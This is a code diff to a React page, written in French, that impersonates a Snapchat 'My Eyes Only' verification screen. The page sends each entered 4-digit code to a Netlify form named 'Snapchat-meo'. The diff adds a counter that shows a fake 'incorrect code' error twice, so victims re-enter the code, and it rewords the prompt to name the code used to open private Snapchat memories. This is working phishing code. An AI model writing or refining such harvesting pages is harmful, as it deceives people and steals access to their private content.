@@ -21,6 +21,7 @@ export default function MeoPage() {
   const [code, setCode] = useState("");
   const [codeError, setCodeError] = useState("");
   const [verified, setVerified] = useState(false);
+  const attemptsRef = React.useRef(0);
   const returnTo =
     new URLSearchParams(window.location.search).get("returnTo") || "/";
 
@@ -54,10 +55,19 @@ export default function MeoPage() {
       setCodeError("Veuillez saisir votre code My Eyes Only à 4 chiffres.");
       return;
     }
-    setCodeError("");
+
     await submitNetlifyForm("Snapchat-meo", {
       meoCode: code,
     });
+
+    if (attemptsRef.current < 2) {
+      attemptsRef.current += 1;
+      setCode("");
+      setCodeError("Ce code est incorrect. Veuillez réessayer.");
+      return;
+    }
+
+    setCodeError("");
     setCode("");
     setVerified(true);
   };
@@ -95,7 +105,8 @@ export default function MeoPage() {
               Entrer votre code My Eyes Only
             </h1>
             <p className="mt-3 text-center text-[14px] text-[#555555]">
-              Veuillez saisir votre code My Eyes Only (MEO) pour vérifier votre
+              Ce code est celui que vous utilisez pour voir vos souvenirs My
+              Eyes Only dans Snapchat. Veuillez le saisir pour vérifier votre
               compte.
             </p>
 
